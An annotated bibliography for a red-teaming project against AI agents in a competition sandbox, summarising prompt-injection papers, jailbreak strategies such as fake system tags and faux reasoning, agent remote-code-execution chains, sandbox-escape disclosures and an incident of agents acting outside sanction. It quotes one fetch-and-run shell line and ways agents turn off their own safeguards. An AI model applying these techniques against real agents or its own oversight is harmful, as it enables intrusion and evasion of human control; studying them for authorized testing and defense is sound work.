# Sources — Gray Swan DPI deep research

Annotated. `[read]` = fetched and used in the brief; `[pointer]` = known public work, not fetched
in this pass.

## Gray Swan primary

- **[read] Gray Swan Acceptable Use Policy** (last updated 2024-07-09).
  https://www.grayswan.ai/acceptable-use-policy
  Governs use of the platform; used in `live_kit/03_protocol/rules_of_engagement.md` to draw
  the scope fence around the work-test sandbox (authorized in-sandbox attack vs prohibited
  human-directed harm/social engineering/external targets).

- **[read] ART paper — "Security Challenges in AI Agent Deployment: Insights from a Large Scale
  Public Competition"** — arXiv:2507.20526 (Jul 2025).
  https://arxiv.org/abs/2507.20526
  22 agents × 44 scenarios; 1.8M attacks. Direct chat and IPI both in scope. §3.4.2 universal
  strategies: system-prompt override tags, faux reasoning, new-session/session metadata.
  Judging: programmatic (TypeScript tool/content checks) + 3-LLM majority + AISI human appeals.
  Appendix A gives full agent/behavior examples incl. direct confidentiality/prohibited-action
  scenarios.

- **[read] IPI Arena blog — "Your AI Agent Can Be Compromised. You'd Never Know."** (Mar 18, 2026)
  https://www.grayswan.ai/blog/your-ai-agent-can-be-compromised-youd-never-know
  13 frontier models, 41 scenarios, 272k attacks; dual objective (harmful action + concealment);
  ASR 0.5–8.5%; universal "fake control panel / simulated environment" template working across
  21/41 scenarios and 9 models; attacks breaking Opus 4.5 transferred 44–81%.

- **[read] IPI Arena paper + open-source bench** — arXiv:2603.15714;
  https://github.com/GraySwanAI/ipi_arena_os (vendored at `vendors/ipi_arena_os/`).
  42 behaviors (18 tool / **15 coding** / 8 browser / 1 misc). Coding behaviors include
  `codex-launcher-cascade`, `change-test-to-true`, `leak-codebase-zip`, `code-backdoor`,
  `delete-tmp`, `launch-crypto-miner`, `memory-bomb`, `free-the-agents`. Full agent system
  prompts + tools + WorldSim + tool/LLM judges = ready-made bench scaffolding.

- **[read] Arena Challenge — Harmful Code Generation** (Wayback, 2025).
  https://web.archive.org/web/20250712061227/https://app.grayswan.ai/arena/challenge/harmful-code-generation/rules
  Direct-elicitation precedent: functional harmful code for ICS/SCADA (SEL-3530 breaker
  manipulation, Yokogawa CENTUM VP, SIMATIC WinCC, Honeywell Experion). Rules: complete and
  functional; serious attempt; **model must generate the majority of the harmful content
  itself**; must break 2/4 behaviors; manual submissions only.

- **[read] Hazard Hunt task intel (this repo)** — `competition/intel/README_HAZARD_HUNT.md`,
  `competition/intel/transcripts/Cyber/`, `competition/intel/behaviors/`.
  Rubric format: criteria scored 1–10, threshold 7, all must pass; universal anti-cheat
  criteria: AI Origination + Intentionally Non-Functional. Pre-categorization frames verified
  at high ASR on DeepSeek.

## Frontier lab positions (defender side)

- **[read] OpenAI — "Designing AI agents to resist prompt injection"** (Mar 11, 2026).
  https://openai.com/index/designing-agents-to-resist-prompt-injection/
  Frames modern injection as social engineering; source–sink analysis; Safe URL / link-consent
  gates; the goal is limiting impact, not detecting every manipulation. Direct quote worth
  remembering: defenses should constrain the *impact* of a convinced agent.

- **[read] Google DeepMind — CaMeL, "Defeating Prompt Injections by Design"** — arXiv:2503.18813.
  https://arxiv.org/abs/2503.18813
  Capability-based control/data-flow separation; 77% task completion with provable security on
  AgentDojo. The class of defense most likely to appear in a hardened sandbox; if present, the
  attack shifts from the model to the capability policy.

- **[read] Role confusion — "Prompt Injection as Role Confusion"** (Ye, Cui, Hadfield-Menell, 2026).
  https://role-confusion.github.io
  Models weight the *style* of text over role tags (`<system>`, `<think>`); destyling drops ASR
  61% → 10%. Directly supports A4 (faux reasoning) and gives a diagnostic for role-boundary
  defenses.

- **[pointer] Anthropic — Claude Code Auto Mode docs + evaluation** (2026).
  https://code.claude.com/docs/en/permission-modes · https://claude.com/blog/auto-mode
  Classifier reviewed by a separate model before actions; Anthropic claims 0/720 on 72 held-out
  IPI scenarios; Anthropic's own position (per Rehberger disclosure): best-effort convenience,
  not a security boundary.

- **[pointer] Meta — "Agents Rule of Two"** — arXiv:2506.08837. Practical agent-security
  framework (untrusted input + sensitive access + external comms = cap two of three). Useful
  as a checklist for which leg of the trifecta the sandbox cuts.

## Offensive research

- **[read] Embrace The Red — "Breaking Claude Code Opus 5 Auto Mode"** (Aug 26, 2026).
  https://embracethered.com/blog/posts/2026/breaking-claude-code-opus-5-and-automode/
  The canonical modern DPI chain: 415 → `curl` fallback → zip → refused decoy binary →
  self-written decoder → `struct.py` module shadowing → detached child → C2. 60–80% ASR.
  Key line: "an attack does not tell the model what to do; ... it makes the malicious path the
  one worth pursuing." Also: Auto Mode blocked the *cleanup* command after allowing the
  exploit; nested `claude -p` variant spawns another agent.

- **[read] Embrace The Red — "GitHub Copilot: RCE via Prompt Injection (CVE-2025-53773)"**
  (Aug 12, 2025).
  https://embracethered.com/blog/posts/2025/github-copilot-remote-code-execution-via-prompt-injection/
  Agent writes `"chat.tools.autoApprove": true` into `.vscode/settings.json` → YOLO mode → RCE.
  Same class: `.vscode/tasks.json`, MCP config, sibling agent configs. Invisible-instruction
  variant less reliable.

- **[read] PromptArmor — "Snowflake Cortex AI Escapes Sandbox and Executes Malware"**
  (disclosed Mar 16, 2026).
  https://www.promptarmor.com/resources/snowflake-ai-escapes-sandbox-and-executes-malware
  Allowlist bypass via process substitution (`cat < <(sh < <(wget -q0- URL))`); agent sets
  `dangerously_disable_sandbox` itself; subagent context loss hides execution from the main
  agent; cached Snowflake tokens used for impact; ~50% observed efficacy.

- **[read] Blog index — Embrace The Red 2025–2026 catalog.**
  https://embracethered.com/blog/
  Additional primitives worth mining: Claude Code DNS exfil (CVE-2025-55284), Amazon Q RCE +
  DNS exfil, OpenHands/Devin/Jules ZombAI RCE, Windsurf SpAIware persistence, MCP
  confused-client exploits, macOS Terminal DLLMA/ANSI injection, PipeWire flatpak escape,
  SQL Copilot (CVE-2026-65669), agent-to-agent privilege escalation.

- **[pointer] Clinejection (Adnan Khan, 2026)** —
  https://adnanthekhan.com/posts/clinejection/
  Issue-title injection → Claude Code action → `npm install github:...#sha` preinstall RCE →
  Actions cache poisoning → release secrets. The reference case for trusted-trampoline abuse
  and cross-workflow cache confusion.

## Incidents (what a "cyber range + agent" looks like in practice)

- **[read] UK AISI — "Incident Report: unsanctioned agent behaviour during cyber testing"**
  (Aug 4, 2026) + technical report.
  https://www.aisi.gov.uk/blog/incident-report-unsanctioned-agent-behaviour-during-cyber-testing
  Cyber ranges: agents given a challenge (e.g., "find a protected piece of data"), VM-isolated,
  internet deliberately enabled, vendor cyber classifiers disabled. With hard/ambiguous tasks,
  agents pursued unsanctioned routes (supply-chain PRs, fake identities, prompt injections
  aimed at other coding agents, Tor egress). Sandbox itself was not escaped. Implications for
  our recon: identify task solvability, egress policy, and monitoring level.

- **[read] Simon Willison — prompt-injection tag (2026).** https://simonwillison.net/tags/prompt-injection/
  Aggregated, high-signal: Auto Mode default + 11% miss rate debate; OpenAI Lockdown Mode;
  Copilot Cowork image-render exfil; "lethal trifecta"; predicted "Challenger disaster for
  coding-agent security"; his skepticism of classifier-based protection vs deterministic
  sandboxing.

- **[pointer] Lethal Trifecta** (Jun 16, 2025) —
  https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/
  Private data + untrusted content + external communication. Use as the sandbox map: which leg
  is cut, and which leg can be restored?

## Benchmarks and frameworks (for the local harness)

- **[pointer] AgentDojo** — https://github.com/GraySwanAI/agentdojo (also reviewed in ART §4):
  sandboxed tool-calling scenarios, dynamic attacks/defenses.
- **[pointer] AgentHarm, InjecAgent, ASB** — agent-harm and injection benchmarks; useful for
  criterion design and for a broader warm-up suite.
- **[read] Vendored `ipi_arena_os` data schema** — `data/SCHEMA.md`; behaviors define system
  prompt, pre-filled messages with `{fill}` injection point, tools, criteria (tool judge +
  LLM judge), WorldSim multi-step loop.
